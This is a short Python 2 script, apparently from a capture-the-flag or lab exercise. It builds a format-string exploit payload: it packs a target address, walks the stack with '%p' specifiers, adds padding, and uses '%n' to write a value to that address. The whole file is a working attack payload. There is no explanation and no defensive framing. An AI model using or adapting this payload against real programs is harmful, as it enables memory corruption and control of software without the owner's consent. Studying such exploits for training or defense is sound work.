from struct import pack

target  = pack("<I",0x402c)

payload = ""
payload +=target
payload += " %p " * 3
payload +="A"*0x41
payload +="%n"

print payload